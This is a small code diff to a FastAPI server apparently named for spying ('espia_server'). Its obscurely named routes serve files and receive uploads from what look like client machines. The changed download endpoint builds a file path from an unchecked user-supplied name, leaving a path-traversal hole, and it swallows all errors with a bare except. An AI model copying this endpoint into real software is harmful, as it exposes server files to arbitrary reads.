@@ -5,7 +5,8 @@ from fastapi import FastAPI, File, UploadFile, Request
 from starlette.responses import FileResponse
 
 from espia_server.app.plugins.mails.mail_handler import send_mail
-from espia_server.app.utils import handle_products_results, handle_new_uploaded_file, create_new_client_dir, block
+from espia_server.app.utils import handle_products_results, handle_new_uploaded_file, create_new_client_dir, block, \
+    static_files_path
 
 # In production we don't want any docs served
 if os.getenv("ESPIA_ENV") == 'prod':
@@ -22,8 +23,10 @@ def root_path() -> dict:
 
 @app.get("/bahaha/{file}")
 def download_file(file: str):
-    static_files_path = f'{pathlib.Path(__file__).parent}/static_files'
-    return FileResponse(path=f'{static_files_path}/{file}', media_type='application/octet-stream', filename=file)
+    try:
+        return FileResponse(path=f'{static_files_path}/{file}', media_type='application/octet-stream', filename=file)
+    except:
+        return "Not found"
 
 
 @app.post("/zn1123n/asnndj")
